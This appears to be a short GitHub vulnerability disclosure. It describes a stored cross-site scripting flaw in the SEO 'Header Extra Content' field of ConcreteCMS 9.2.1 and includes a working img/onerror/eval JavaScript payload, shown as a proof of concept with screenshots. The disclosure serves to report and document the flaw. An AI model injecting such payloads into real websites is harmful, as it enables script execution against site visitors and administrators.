# ConcreteCMS Stored XSS v.9.2.1

## Author: (Sergio)

**Description:** Cross Site Scripting vulnerability in ConcreteCMS v.9.2.1 allows a local attacker to execute arbitrary code via a crafted script to the SEO - Extra from Page Settings.

**Attack Vectors:** Scripting A vulnerability in the sanitization of the entry in the "Header Extra Content" of "SEO" allows injecting JavaScript code that will be executed when the user accesses the web page.

---

### POC:


When logging into the panel, we will go to the "Page Settings - SEO".

![image](https://github.com/sromanhu/ConcreteCMS-Stored-XSS---SEO-Extra/assets/87250597/4c5f46f7-368e-4c0a-828f-20b763319c58)




### XSS Payload:

```js
<img src=x:alert(alt) onerror=eval(src) alt='XSS Extra
```


In the following image you can see the embedded code that executes the payload in the main web.
![image](https://github.com/sromanhu/ConcreteCMS-Stored-XSS---SEO-Extra/assets/87250597/780dbb1f-7fe3-4e06-be79-788b85b421e1)



</br>

### Additional Information:
https://www.concretecms.com/

https://owasp.org/Top10/es/A03_2021-Injection/
